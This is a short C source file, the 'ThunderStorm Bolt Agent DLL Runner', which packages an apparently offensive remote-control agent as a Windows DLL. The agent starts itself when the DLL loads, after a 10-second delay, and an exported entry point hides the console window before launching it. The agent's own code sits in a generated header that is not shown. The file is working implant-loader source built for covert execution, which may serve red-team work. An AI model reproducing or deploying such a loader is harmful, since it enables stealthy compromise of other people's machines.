// Copyright (C) 2021 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//
// ThunderStorm Bolt Agent DLL Runner
//  Wraps the Go archive and will control a Bolt Agent

// Windows Xp+
#define WINVER 0x0501
#define _WIN32_WINNT 0x0501
// Windows Vista+
// #define WINVER 0x0600
// #define _WIN32_WINNT 0x0600

#define NOCOMM
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#define STACK_SIZE 512000000*2
#define EXPORT __declspec(dllexport)

// Bolt Include (Generated before compile)
#include "bolt.h"

DWORD beginthread() {
    Sleep(10000);
    boltAgent(0, 0);
    return 0;
}

EXPORT void initHandle(HWND h, HINSTANCE i, LPSTR a, int s) {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, SW_HIDE);
    }
    beginthread();
}

EXPORT BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID args) {
    if (r == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, STACK_SIZE, (LPTHREAD_START_ROUTINE)beginthread, NULL, 0, NULL);
    }
    return TRUE;
}
